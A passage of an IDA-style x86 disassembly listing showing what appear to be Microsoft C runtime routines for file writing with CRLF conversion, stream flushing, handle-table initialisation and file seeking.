; ---------------------------------------------------------------------------

loc_414E18:                             ; CODE XREF: sub_4148B5+48C↑j
                cmp     [ebp+nNumberOfBytesToWrite], ecx
                jbe     loc_414F9D

loc_414E21:                             ; CODE XREF: sub_4148B5+65C↓j
                mov     ecx, [ebp+var_1ABC]
                and     [ebp+NumberOfBytesWritten], 0
                sub     ecx, [ebp+lpBuffer]
                push    2
                lea     eax, [ebp+var_6B8]
                pop     esi

loc_414E3D:                             ; CODE XREF: sub_4148B5+5C7↓j
                cmp     ecx, [ebp+nNumberOfBytesToWrite]
                jnb     short loc_414E7E
                mov     edx, [ebp+var_1ABC]
                movzx   edx, word ptr [edx]
                add     [ebp+var_1ABC], esi
                add     ecx, esi
                cmp     dx, 0Ah
                jnz     short loc_414E67
                push    0Dh
                pop     ebx
                mov     [eax], bx
                add     eax, esi
                add     [ebp+NumberOfBytesWritten], esi

loc_414E67:                             ; CODE XREF: sub_4148B5+5A2↑j
                add     [ebp+NumberOfBytesWritten], esi
                mov     [eax], dx
                add     eax, esi
                cmp     [ebp+NumberOfBytesWritten], 6A8h
                jb      short loc_414E3D

loc_414E7E:                             ; CODE XREF: sub_4148B5+58B↑j
                xor     esi, esi
                push    esi             ; lpUsedDefaultChar
                push    esi             ; lpDefaultChar
                push    0D55h           ; cbMultiByte
                lea     ecx, [ebp+var_1410]
                push    ecx             ; lpMultiByteStr
                lea     ecx, [ebp+var_6B8]
                sub     eax, ecx
                cdq
                sub     eax, edx
                sar     eax, 1
                push    eax             ; cchWideChar
                mov     eax, ecx
                push    eax             ; lpWideCharStr
                push    esi             ; dwFlags
                push    0FDE9h          ; CodePage
                call    ds:WideCharToMultiByte
                mov     ebx, eax
                cmp     ebx, esi
                jz      loc_414F4C

loc_414EB5:                             ; CODE XREF: sub_4148B5+633↓j
                push    0               ; lpOverlapped
                lea     eax, [ebp+var_1AD4]
                push    eax             ; lpNumberOfBytesWritten
                mov     eax, ebx
                sub     eax, esi
                push    eax             ; nNumberOfBytesToWrite
                lea     eax, [ebp+esi+var_1410]
                push    eax             ; lpBuffer
                mov     eax, [ebp+var_1AD8]
                mov     eax, [eax]
                push    dword ptr [edi+eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      short loc_414EEC
                add     esi, [ebp+var_1AD4]
                cmp     ebx, esi
                jg      short loc_414EB5
                jmp     short loc_414EF8
; ---------------------------------------------------------------------------

loc_414EEC:                             ; CODE XREF: sub_4148B5+629↑j
                call    ds:GetLastError
                mov     dword ptr [ebp+WideCharStr], eax

loc_414EF8:                             ; CODE XREF: sub_4148B5+635↑j
                cmp     ebx, esi
                jg      short loc_414F58
                mov     eax, [ebp+var_1ABC]
                sub     eax, [ebp+lpBuffer]
                mov     [ebp+var_1AC8], eax
                cmp     eax, [ebp+nNumberOfBytesToWrite]
                jb      loc_414E21
                jmp     short loc_414F58
; ---------------------------------------------------------------------------

loc_414F19:                             ; CODE XREF: sub_4148B5+39F↑j
                push    0               ; lpOverlapped
                lea     ecx, [ebp+var_1AD4]
                push    ecx             ; lpNumberOfBytesWritten
                push    [ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
                push    [ebp+lpBuffer]  ; lpBuffer
                push    dword ptr [eax] ; hFile
                call    ds:WriteFile
                test    eax, eax
                jz      short loc_414F4C
                mov     eax, [ebp+var_1AD4]
                and     dword ptr [ebp+WideCharStr], 0
                mov     [ebp+var_1AC8], eax
                jmp     short loc_414F58
; ---------------------------------------------------------------------------

loc_414F4C:                             ; CODE XREF: sub_4148B5+268↑j
                                        ; sub_4148B5+2C1↑j ...
                call    ds:GetLastError
                mov     dword ptr [ebp+WideCharStr], eax

loc_414F58:                             ; CODE XREF: sub_4148B5+1EC↑j
                                        ; sub_4148B5+210↑j ...
                cmp     [ebp+var_1AC8], 0
                jnz     short loc_414FCD

loc_414F61:                             ; CODE XREF: sub_4148B5+164↑j
                cmp     dword ptr [ebp+WideCharStr], 0
                jz      short loc_414F97
                push    5
                pop     esi
                cmp     dword ptr [ebp+WideCharStr], esi
                jnz     short loc_414F89
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], esi
                jmp     short loc_414FC8
; ---------------------------------------------------------------------------

loc_414F89:                             ; CODE XREF: sub_4148B5+6BE↑j
                push    dword ptr [ebp+WideCharStr]
                call    sub_410934
                pop     ecx
                jmp     short loc_414FC8
; ---------------------------------------------------------------------------

loc_414F97:                             ; CODE XREF: sub_4148B5+6B3↑j
                mov     esi, [ebp+var_1AD8]

loc_414F9D:                             ; CODE XREF: sub_4148B5+3C2↑j
                                        ; sub_4148B5+495↑j ...
                mov     eax, [esi]
                test    byte ptr [edi+eax+4], 40h
                jz      short loc_414FB5
                mov     eax, [ebp+lpBuffer]
                cmp     byte ptr [eax], 1Ah
                jnz     short loc_414FB5
                xor     eax, eax
                jmp     short loc_414FD9
; ---------------------------------------------------------------------------

loc_414FB5:                             ; CODE XREF: sub_4148B5+6EF↑j
                                        ; sub_4148B5+6FA↑j
                call    sub_41090E
                mov     dword ptr [eax], 1Ch
                call    sub_410921
                and     dword ptr [eax], 0

loc_414FC8:                             ; CODE XREF: sub_4148B5+CB↑j
                                        ; sub_4148B5+6D2↑j ...
                or      eax, 0FFFFFFFFh
                jmp     short loc_414FD9
; ---------------------------------------------------------------------------

loc_414FCD:                             ; CODE XREF: sub_4148B5+6AA↑j
                mov     eax, [ebp+var_1AC8]
                sub     eax, [ebp+var_1AD0]

loc_414FD9:                             ; CODE XREF: sub_4148B5+6FE↑j
                                        ; sub_4148B5+716↑j
                pop     edi
                pop     ebx

loc_414FDB:                             ; CODE XREF: sub_4148B5+38↑j
                                        ; sub_4148B5+63↑j
                mov     ecx, [ebp+var_4]
                xor     ecx, ebp
                pop     esi
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                leave
                retn
sub_4148B5      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_414FE8(int, int, DWORD nNumberOfBytesToWrite)
sub_414FE8      proc near               ; CODE XREF: sub_40F1E3+EB↑p
                                        ; sub_410957+CF↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

                push    10h
                push    offset stru_422ED8
                call    __SEH_prolog4
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_415017
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_41500F:                             ; CODE XREF: sub_414FE8+5C↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_4150B4
; ---------------------------------------------------------------------------

loc_415017:                             ; CODE XREF: sub_414FE8+12↑j
                xor     edi, edi
                cmp     eax, edi
                jl      short loc_415025
                cmp     eax, uNumber
                jb      short loc_415046

loc_415025:                             ; CODE XREF: sub_414FE8+33↑j
                                        ; sub_414FE8+7C↓j
                call    sub_410921
                mov     [eax], edi
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_41500F
; ---------------------------------------------------------------------------

loc_415046:                             ; CODE XREF: sub_414FE8+3B↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     ebx, dword_42CA00[ecx*4]
                mov     esi, eax
                and     esi, 1Fh
                shl     esi, 6
                mov     ecx, [ebx]
                movsx   ecx, byte ptr [ecx+esi+4]
                and     ecx, 1
                jz      short loc_415025
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                mov     eax, [ebx]
                test    byte ptr [eax+esi+4], 1
                jz      short loc_41508F
                push    [ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
                push    [ebp+arg_4]     ; int
                push    [ebp+arg_0]     ; int
                call    sub_4148B5
                add     esp, 0Ch
                mov     [ebp+var_1C], eax
                jmp     short loc_4150A5
; ---------------------------------------------------------------------------

loc_41508F:                             ; CODE XREF: sub_414FE8+8F↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], edi
                or      [ebp+var_1C], 0FFFFFFFFh

loc_4150A5:                             ; CODE XREF: sub_414FE8+A5↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_4150BA
; ---------------------------------------------------------------------------

loc_4150B1:                             ; CODE XREF: sub_414FE8+DB↓j
                mov     eax, [ebp+var_1C]

loc_4150B4:                             ; CODE XREF: sub_414FE8+2A↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_4150BA:                             ; CODE XREF: sub_414FE8+C4↑j
                                        ; DATA XREF: .rdata:stru_422ED8↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_414FE8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4150C4      proc near               ; CODE XREF: sub_40F1E3+C4↑p
                                        ; sub_40F5D2+3B↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                mov     eax, [esi+0Ch]
                mov     ecx, eax
                and     cl, 3
                xor     ebx, ebx
                cmp     cl, 2
                jnz     short loc_41511D
                test    eax, 108h
                jz      short loc_41511D
                mov     eax, [esi+8]
                push    edi
                mov     edi, [esi]
                sub     edi, eax
                test    edi, edi
                jle     short loc_41511C
                push    edi             ; nNumberOfBytesToWrite
                push    eax             ; int
                push    esi
                call    sub_40F9B4
                pop     ecx
                push    eax             ; int
                call    sub_414FE8
                add     esp, 0Ch
                cmp     eax, edi
                jnz     short loc_415115
                mov     eax, [esi+0Ch]
                test    al, al
                jns     short loc_41511C
                and     eax, 0FFFFFFFDh
                mov     [esi+0Ch], eax
                jmp     short loc_41511C
; ---------------------------------------------------------------------------

loc_415115:                             ; CODE XREF: sub_4150C4+40↑j
                or      dword ptr [esi+0Ch], 20h
                or      ebx, 0FFFFFFFFh

loc_41511C:                             ; CODE XREF: sub_4150C4+2A↑j
                                        ; sub_4150C4+47↑j ...
                pop     edi

loc_41511D:                             ; CODE XREF: sub_4150C4+17↑j
                                        ; sub_4150C4+1E↑j
                mov     eax, [esi+8]
                and     dword ptr [esi+4], 0
                mov     [esi], eax
                pop     esi
                mov     eax, ebx
                pop     ebx
                pop     ebp
                retn
sub_4150C4      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41512C      proc near               ; CODE XREF: sub_415174+69↓p
                                        ; sub_415174+84↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                test    esi, esi
                jnz     short loc_415142
                push    esi
                call    sub_415174
                pop     ecx
                jmp     short loc_415171
; ---------------------------------------------------------------------------

loc_415142:                             ; CODE XREF: sub_41512C+B↑j
                push    esi
                call    sub_4150C4
                pop     ecx
                test    eax, eax
                jz      short loc_415152
                or      eax, 0FFFFFFFFh
                jmp     short loc_415171
; ---------------------------------------------------------------------------

loc_415152:                             ; CODE XREF: sub_41512C+1F↑j
                test    dword ptr [esi+0Ch], 4000h
                jz      short loc_41516F
                push    esi
                call    sub_40F9B4
                push    eax
                call    sub_41ADBB
                pop     ecx
                neg     eax
                pop     ecx
                sbb     eax, eax
                jmp     short loc_415171
; ---------------------------------------------------------------------------

loc_41516F:                             ; CODE XREF: sub_41512C+2D↑j
                xor     eax, eax

loc_415171:                             ; CODE XREF: sub_41512C+14↑j
                                        ; sub_41512C+24↑j ...
                pop     esi
                pop     ebp
                retn
sub_41512C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415174      proc near               ; CODE XREF: sub_41512C+E↑p
                                        ; sub_41524E+2↓p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8

                push    14h
                push    offset stru_422EF8
                call    __SEH_prolog4
                xor     edi, edi
                mov     [ebp+var_1C], edi
                mov     [ebp+var_24], edi
                push    1
                call    sub_416913
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                xor     esi, esi

loc_415195:                             ; CODE XREF: sub_415174+9B↓j
                mov     [ebp+var_20], esi
                cmp     esi, dword_42DB20
                jge     loc_415227
                mov     eax, dword_42CB00
                lea     eax, [eax+esi*4]
                cmp     [eax], edi
                jz      short loc_41520E
                mov     eax, [eax]
                test    byte ptr [eax+0Ch], 83h
                jz      short loc_41520E
                push    eax
                push    esi
                call    sub_4136B2
                pop     ecx
                pop     ecx
                xor     edx, edx
                inc     edx
                mov     [ebp+ms_exc.registration.TryLevel], edx
                mov     eax, dword_42CB00
                mov     eax, [eax+esi*4]
                mov     ecx, [eax+0Ch]
                test    cl, 83h
                jz      short loc_415206
                cmp     [ebp+arg_0], edx
                jnz     short loc_4151ED
                push    eax
                call    sub_41512C
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jz      short loc_415206
                inc     [ebp+var_1C]
                jmp     short loc_415206
; ---------------------------------------------------------------------------

loc_4151ED:                             ; CODE XREF: sub_415174+66↑j
                cmp     [ebp+arg_0], edi
                jnz     short loc_415206
                test    cl, 2
                jz      short loc_415206
                push    eax
                call    sub_41512C
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_415206
                or      [ebp+var_24], eax

loc_415206:                             ; CODE XREF: sub_415174+61↑j
                                        ; sub_415174+72↑j ...
                mov     [ebp+ms_exc.registration.TryLevel], edi
                call    loc_415216
; ---------------------------------------------------------------------------

loc_41520E:                             ; CODE XREF: sub_415174+3A↑j
                                        ; sub_415174+42↑j ...
                inc     esi
                jmp     short loc_415195
; ---------------------------------------------------------------------------

loc_415211:                             ; DATA XREF: .rdata:stru_422EF8↓o
                xor     edi, edi
                mov     esi, [ebp+var_20]

loc_415216:                             ; CODE XREF: sub_415174+95↑j
                mov     eax, dword_42CB00
                push    dword ptr [eax+esi*4]
                push    esi
                call    sub_413720
                pop     ecx
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_415227:                             ; CODE XREF: sub_415174+2A↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_415245
; ---------------------------------------------------------------------------

loc_415233:                             ; CODE XREF: sub_415174+D9↓j
                cmp     [ebp+arg_0], 1
                mov     eax, [ebp+var_1C]
                jz      short loc_41523F
                mov     eax, [ebp+var_24]

loc_41523F:                             ; CODE XREF: sub_415174+C6↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_415245:                             ; CODE XREF: sub_415174+BA↑j
                                        ; DATA XREF: .rdata:stru_422EF8↓o
                push    1
                call    sub_416839
                pop     ecx
                retn
sub_415174      endp


; =============== S U B R O U T I N E =======================================


sub_41524E      proc near               ; CODE XREF: sub_413651↑p
                push    1
                call    sub_415174
                pop     ecx
                retn
sub_41524E      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_415257      proc near               ; CODE XREF: start-CE↑p

StartupInfo     = _STARTUPINFOA ptr -64h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h

                push    54h
                push    offset stru_422F20
                call    __SEH_prolog4
                xor     edi, edi
                mov     [ebp+ms_exc.registration.TryLevel], edi
                lea     eax, [ebp+StartupInfo]
                push    eax             ; lpStartupInfo
                call    ds:GetStartupInfoA
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                push    40h
                push    20h
                pop     esi
                push    esi
                call    sub_412BF8
                pop     ecx
                pop     ecx
                cmp     eax, edi
                jz      loc_4154A2
                mov     dword_42CA00, eax
                mov     uNumber, esi
                lea     ecx, [eax+800h]
                jmp     short loc_4152D1
; ---------------------------------------------------------------------------

loc_4152A1:                             ; CODE XREF: sub_415257+7C↓j
                mov     byte ptr [eax+4], 0
                or      dword ptr [eax], 0FFFFFFFFh
                mov     byte ptr [eax+5], 0Ah
                mov     [eax+8], edi
                mov     byte ptr [eax+24h], 0
                mov     byte ptr [eax+25h], 0Ah
                mov     byte ptr [eax+26h], 0Ah
                mov     [eax+38h], edi
                mov     byte ptr [eax+34h], 0
                add     eax, 40h
                mov     ecx, dword_42CA00
                add     ecx, 800h

loc_4152D1:                             ; CODE XREF: sub_415257+48↑j
                cmp     eax, ecx
                jb      short loc_4152A1
                cmp     [ebp+StartupInfo.cbReserved2], di
                jz      loc_4153E9
                mov     eax, [ebp+StartupInfo.lpReserved2]
                cmp     eax, edi
                jz      loc_4153E9
                mov     edi, [eax]
                lea     ebx, [eax+4]
                lea     eax, [ebx+edi]
                mov     [ebp+var_1C], eax
                mov     esi, 800h
                cmp     edi, esi
                jl      short loc_415300
                mov     edi, esi

loc_415300:                             ; CODE XREF: sub_415257+A5↑j
                mov     [ebp+var_20], 1
                jmp     short loc_415364
; ---------------------------------------------------------------------------

loc_415309:                             ; CODE XREF: sub_415257+113↓j
                push    40h
                push    20h
                call    sub_412BF8
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_41536E
                mov     ecx, [ebp+var_20]
                lea     ecx, dword_42CA00[ecx*4]
                mov     [ecx], eax
                add     uNumber, 20h
                lea     edx, [eax+800h]
                jmp     short loc_41535D
; ---------------------------------------------------------------------------

loc_415333:                             ; CODE XREF: sub_415257+108↓j
                mov     byte ptr [eax+4], 0
                or      dword ptr [eax], 0FFFFFFFFh
                mov     byte ptr [eax+5], 0Ah
                and     dword ptr [eax+8], 0
                and     byte ptr [eax+24h], 80h
                mov     byte ptr [eax+25h], 0Ah
                mov     byte ptr [eax+26h], 0Ah
                and     dword ptr [eax+38h], 0
                mov     byte ptr [eax+34h], 0
                add     eax, 40h
                mov     edx, [ecx]
                add     edx, esi

loc_41535D:                             ; CODE XREF: sub_415257+DA↑j
                cmp     eax, edx
                jb      short loc_415333
                inc     [ebp+var_20]

loc_415364:                             ; CODE XREF: sub_415257+B0↑j
                cmp     uNumber, edi
                jl      short loc_415309
                jmp     short loc_415374
; ---------------------------------------------------------------------------

loc_41536E:                             ; CODE XREF: sub_415257+BF↑j
                mov     edi, uNumber

loc_415374:                             ; CODE XREF: sub_415257+115↑j
                and     [ebp+var_20], 0
                test    edi, edi
                jle     short loc_4153E9

loc_41537C:                             ; CODE XREF: sub_415257+190↓j
                mov     eax, [ebp+var_1C]
                mov     ecx, [eax]
                cmp     ecx, 0FFFFFFFFh
                jz      short loc_4153DC
                cmp     ecx, 0FFFFFFFEh
                jz      short loc_4153DC
                mov     al, [ebx]
                test    al, 1
                jz      short loc_4153DC
                test    al, 8
                jnz     short loc_4153A0
                push    ecx             ; hFile
                call    ds:GetFileType
                test    eax, eax
                jz      short loc_4153DC

loc_4153A0:                             ; CODE XREF: sub_415257+13C↑j
                mov     esi, [ebp+var_20]
                mov     eax, esi
                sar     eax, 5
                and     esi, 1Fh
                shl     esi, 6
                add     esi, dword_42CA00[eax*4]
                mov     eax, [ebp+var_1C]
                mov     eax, [eax]
                mov     [esi], eax
                mov     al, [ebx]
                mov     [esi+4], al
                push    0FA0h           ; dwSpinCount
                lea     eax, [esi+0Ch]
                push    eax             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      loc_4154A2
                inc     dword ptr [esi+8]

loc_4153DC:                             ; CODE XREF: sub_415257+12D↑j
                                        ; sub_415257+132↑j ...
                inc     [ebp+var_20]
                inc     ebx
                add     [ebp+var_1C], 4
                cmp     [ebp+var_20], edi
                jl      short loc_41537C

loc_4153E9:                             ; CODE XREF: sub_415257+82↑j
                                        ; sub_415257+8D↑j ...
                xor     ebx, ebx

loc_4153EB:                             ; CODE XREF: sub_415257+227↓j
                mov     esi, ebx
                shl     esi, 6
                add     esi, dword_42CA00
                mov     eax, [esi]
                cmp     eax, 0FFFFFFFFh
                jz      short loc_415408
                cmp     eax, 0FFFFFFFEh
                jz      short loc_415408
                or      byte ptr [esi+4], 80h
                jmp     short loc_41547A
; ---------------------------------------------------------------------------

loc_415408:                             ; CODE XREF: sub_415257+1A4↑j
                                        ; sub_415257+1A9↑j
                mov     byte ptr [esi+4], 81h
                test    ebx, ebx
                jnz     short loc_415415
                push    0FFFFFFF6h
                pop     eax
                jmp     short loc_41541F
; ---------------------------------------------------------------------------

loc_415415:                             ; CODE XREF: sub_415257+1B7↑j
                mov     eax, ebx
                dec     eax
                neg     eax
                sbb     eax, eax
                add     eax, 0FFFFFFF5h

loc_41541F:                             ; CODE XREF: sub_415257+1BC↑j
                push    eax             ; nStdHandle
                call    ds:GetStdHandle
                mov     edi, eax
                cmp     edi, 0FFFFFFFFh
                jz      short loc_415470
                test    edi, edi
                jz      short loc_415470
                push    edi             ; hFile
                call    ds:GetFileType
                test    eax, eax
                jz      short loc_415470
                mov     [esi], edi
                and     eax, 0FFh
                cmp     eax, 2
                jnz     short loc_41544E
                or      byte ptr [esi+4], 40h
                jmp     short loc_415457
; ---------------------------------------------------------------------------

loc_41544E:                             ; CODE XREF: sub_415257+1EF↑j
                cmp     eax, 3
                jnz     short loc_415457
                or      byte ptr [esi+4], 8

loc_415457:                             ; CODE XREF: sub_415257+1F5↑j
                                        ; sub_415257+1FA↑j
                push    0FA0h           ; dwSpinCount
                lea     eax, [esi+0Ch]
                push    eax             ; lpCriticalSection
                call    sub_419CA1
                pop     ecx
                pop     ecx
                test    eax, eax
                jz      short loc_4154A2
                inc     dword ptr [esi+8]
                jmp     short loc_41547A
; ---------------------------------------------------------------------------

loc_415470:                             ; CODE XREF: sub_415257+1D4↑j
                                        ; sub_415257+1D8↑j ...
                or      byte ptr [esi+4], 40h
                mov     dword ptr [esi], 0FFFFFFFEh

loc_41547A:                             ; CODE XREF: sub_415257+1AF↑j
                                        ; sub_415257+217↑j
                inc     ebx
                cmp     ebx, 3
                jl      loc_4153EB
                push    uNumber         ; uNumber
                call    ds:SetHandleCount
                xor     eax, eax
                jmp     short loc_4154A5
; ---------------------------------------------------------------------------

loc_415494:                             ; DATA XREF: .rdata:stru_422F20↓o
                xor     eax, eax
                inc     eax
                retn
; ---------------------------------------------------------------------------

loc_415498:                             ; DATA XREF: .rdata:stru_422F20↓o
                mov     esp, [ebp+ms_exc.old_esp]
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh

loc_4154A2:                             ; CODE XREF: sub_415257+31↑j
                                        ; sub_415257+17C↑j ...
                or      eax, 0FFFFFFFFh

loc_4154A5:                             ; CODE XREF: sub_415257+23B↑j
                call    __SEH_epilog4
                retn
sub_415257      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_4154AB(int, LONG lDistanceToMove, DWORD dwMoveMethod)
sub_4154AB      proc near               ; CODE XREF: sub_415520+9A↓p
                                        ; sub_419E86+377↓p ...

arg_0           = dword ptr  8
lDistanceToMove = dword ptr  0Ch
dwMoveMethod    = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, [ebp+arg_0]
                push    esi
                call    sub_416266
                pop     ecx
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_4154D0
                call    sub_41090E
                mov     dword ptr [eax], 9
                or      eax, 0FFFFFFFFh
                jmp     short loc_41551D
; ---------------------------------------------------------------------------

loc_4154D0:                             ; CODE XREF: sub_4154AB+13↑j
                push    edi
                push    [ebp+dwMoveMethod] ; dwMoveMethod
                push    0               ; lpDistanceToMoveHigh
                push    [ebp+lDistanceToMove] ; lDistanceToMove
                push    eax             ; hFile
                call    ds:SetFilePointer
                mov     edi, eax
                cmp     edi, 0FFFFFFFFh
                jnz     short loc_4154EF
                call    ds:GetLastError
                jmp     short loc_4154F1
; ---------------------------------------------------------------------------

loc_4154EF:                             ; CODE XREF: sub_4154AB+3A↑j
                xor     eax, eax

loc_4154F1:                             ; CODE XREF: sub_4154AB+42↑j
                test    eax, eax
                jz      short loc_415501
                push    eax
                call    sub_410934
                pop     ecx
                or      eax, 0FFFFFFFFh
                jmp     short loc_41551C
; ---------------------------------------------------------------------------

loc_415501:                             ; CODE XREF: sub_4154AB+48↑j
                mov     eax, esi
                sar     eax, 5
                mov     eax, dword_42CA00[eax*4]
                and     esi, 1Fh
                shl     esi, 6
                lea     eax, [eax+esi+4]
                and     byte ptr [eax], 0FDh
                mov     eax, edi

loc_41551C:                             ; CODE XREF: sub_4154AB+54↑j
                pop     edi

loc_41551D:                             ; CODE XREF: sub_4154AB+23↑j
                pop     esi
                pop     ebp
                retn
sub_4154AB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_415520(int, LONG lDistanceToMove, DWORD dwMoveMethod)
sub_415520      proc near               ; CODE XREF: sub_40F3C7+49↑p
                                        ; sub_40F3C7+118↑p ...

var_1C          = dword ptr -1Ch
ms_exc          = CPPEH_RECORD ptr -18h
arg_0           = dword ptr  8
lDistanceToMove = dword ptr  0Ch
dwMoveMethod    = dword ptr  10h

                push    10h
                push    offset stru_422F40
                call    __SEH_prolog4
                mov     eax, [ebp+arg_0]
                cmp     eax, 0FFFFFFFEh
                jnz     short loc_41554F
                call    sub_410921
                and     dword ptr [eax], 0
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_415547:                             ; CODE XREF: sub_415520+5C↓j
                or      eax, 0FFFFFFFFh
                jmp     loc_4155EC
; ---------------------------------------------------------------------------

loc_41554F:                             ; CODE XREF: sub_415520+12↑j
                xor     edi, edi
                cmp     eax, edi
                jl      short loc_41555D
                cmp     eax, uNumber
                jb      short loc_41557E

loc_41555D:                             ; CODE XREF: sub_415520+33↑j
                                        ; sub_415520+7C↓j
                call    sub_410921
                mov     [eax], edi
                call    sub_41090E
                mov     dword ptr [eax], 9
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                jmp     short loc_415547
; ---------------------------------------------------------------------------

loc_41557E:                             ; CODE XREF: sub_415520+3B↑j
                mov     ecx, eax
                sar     ecx, 5
                lea     ebx, dword_42CA00[ecx*4]
                mov     esi, eax
                and     esi, 1Fh
                shl     esi, 6
                mov     ecx, [ebx]
                movsx   ecx, byte ptr [ecx+esi+4]
                and     ecx, 1
                jz      short loc_41555D
                push    eax
                call    sub_4162DD
                pop     ecx
                mov     [ebp+ms_exc.registration.TryLevel], edi
                mov     eax, [ebx]
                test    byte ptr [eax+esi+4], 1
                jz      short loc_4155C7
                push    [ebp+dwMoveMethod] ; dwMoveMethod
                push    [ebp+lDistanceToMove] ; lDistanceToMove
                push    [ebp+arg_0]     ; int
                call    sub_4154AB
                add     esp, 0Ch
                mov     [ebp+var_1C], eax
                jmp     short loc_4155DD
; ---------------------------------------------------------------------------

loc_4155C7:                             ; CODE XREF: sub_415520+8F↑j
                call    sub_41090E
                mov     dword ptr [eax], 9
                call    sub_410921
                mov     [eax], edi
                or      [ebp+var_1C], 0FFFFFFFFh

loc_4155DD:                             ; CODE XREF: sub_415520+A5↑j
                mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh
                call    loc_4155F2
; ---------------------------------------------------------------------------

loc_4155E9:                             ; CODE XREF: sub_415520+DB↓j
                mov     eax, [ebp+var_1C]

loc_4155EC:                             ; CODE XREF: sub_415520+2A↑j
                call    __SEH_epilog4
                retn
; ---------------------------------------------------------------------------

loc_4155F2:                             ; CODE XREF: sub_415520+C4↑j
                                        ; DATA XREF: .rdata:stru_422F40↓o
                push    [ebp+arg_0]
                call    sub_41637D
                pop     ecx
                retn
sub_415520      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4155FC      proc near               ; CODE XREF: sub_40F6E1+90↑p

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = byte ptr -10h
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_14          = dword ptr  1Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 24h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                mov     eax, [ebp+arg_14]
                mov     ecx, [ebp+arg_4]
                push    ebx
                push    esi
                mov     esi, [ebp+arg_0]
                push    edi
                push    eax
                xor     edi, edi
                push    edi
                push    edi
                push    edi
                push    edi
                push    ecx
                lea     eax, [ebp+var_24]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                mov     [ebp+var_20], ecx
                xor     ebx, ebx
                call    sub_415727
                add     esp, 20h
                mov     [ebp+var_14], eax
                test    al, 4
                jz      short loc_41564B
                mov     ebx, 200h
                mov     [ebp+var_1C], edi
                mov     [ebp+var_18], edi
                jmp     short loc_41567B
; ---------------------------------------------------------------------------

loc_41564B:                             ; CODE XREF: sub_4155FC+40↑j
                lea     eax, [ebp+var_1C]
                push    eax
                lea     eax, [ebp+var_10]
                push    eax
                call    sub_41AE9C
                test    byte ptr [ebp+var_14], 2
                pop     ecx
                pop     ecx
                jnz     short loc_415665
                cmp     eax, 1
                jnz     short loc_41566A

loc_415665:                             ; CODE XREF: sub_4155FC+62↑j
                mov     ebx, 80h

loc_41566A:                             ; CODE XREF: sub_4155FC+67↑j
                test    byte ptr [ebp+var_14], 1
                jnz     short loc_415675
                cmp     eax, 2
                jnz     short loc_41567B

loc_415675:                             ; CODE XREF: sub_4155FC+72↑j
                or      ebx, 100h

loc_41567B:                             ; CODE XREF: sub_4155FC+4D↑j
                                        ; sub_4155FC+77↑j
                mov     eax, [ebp+var_24]
                sub     eax, [ebp+var_20]
                mov     ecx, [ebp+var_4]
